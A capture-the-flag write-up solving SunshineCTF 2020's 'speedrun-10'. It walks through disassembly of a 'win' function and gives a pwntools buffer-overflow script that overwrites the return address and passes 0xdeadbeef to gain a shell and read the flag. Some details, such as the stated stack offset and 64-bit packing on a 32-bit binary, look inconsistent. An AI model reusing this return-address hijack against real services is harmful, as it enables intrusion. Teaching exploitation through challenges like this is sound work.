# speedrun-10

## Task

nc chal.2020.sunshinectf.org 30010

File: chall_10

Tags: binary exploitation

## Solution

Nothing interesting in this one. Simple buffer overflow in `sym.vuln`, find offset with gdb and pattern, write return address of `win`.

```nasm
[0x080483c0]> pdf@sym.win
┌ 52: sym.win (uint32_t arg_8h);
│           ; var int32_t var_4h @ ebp-0x4
│           ; arg uint32_t arg_8h @ ebp+0x8
│           0x080484d6      55             push ebp
│           0x080484d7      89e5           mov ebp, esp
│           0x080484d9      53             push ebx
│           0x080484da      83ec04         sub esp, 4
│           0x080484dd      e8a9000000     call sym.__x86.get_pc_thunk.ax
│           0x080484e2      051e1b0000     add eax, 0x1b1e
│           0x080484e7      817d08efbead.  cmp dword [arg_8h], 0xdeadbeef
│       ┌─< 0x080484ee      7514           jne 0x8048504
│       │   0x080484f0      83ec0c         sub esp, 0xc
│       │   0x080484f3      8d9010e6ffff   lea edx, [eax - 0x19f0]
│       │   0x080484f9      52             push edx                    ; const char *string
│       │   0x080484fa      89c3           mov ebx, eax
│       │   0x080484fc      e88ffeffff     call sym.imp.system         ; int system(const char *string)
│       │   0x08048501      83c410         add esp, 0x10
│       │   ; CODE XREF from sym.win @ 0x80484ee
│       └─> 0x08048504      90             nop
│           0x08048505      8b5dfc         mov ebx, dword [var_4h]
│           0x08048508      c9             leave
└           0x08048509      c3             ret
```

We see we need to write `0xdeadbeef` to `ebp-0x8`. No problem with that.

```python
from pwn import *

e = ELF("./chall_10")

#p = e.process()
p = remote("chal.2020.sunshinectf.org", 30010)

payload  = "A"*62
payload += p64(e.symbols["win"])
payload += p64(0xdeadbeef)

p.sendline()
p.sendline(payload)
p.interactive()
```

And get our flag:

```bash
$ python2 pwny.py
[+] Opening connection to chal.2020.sunshinectf.org on port 30010: Done
[*] Switching to interactive mode
Don't waste your time, or...
$ ls
chall_10
flag.txt
$ cat flag.txt
sun{second-heartbeat-aeaff82332769d0f}
```
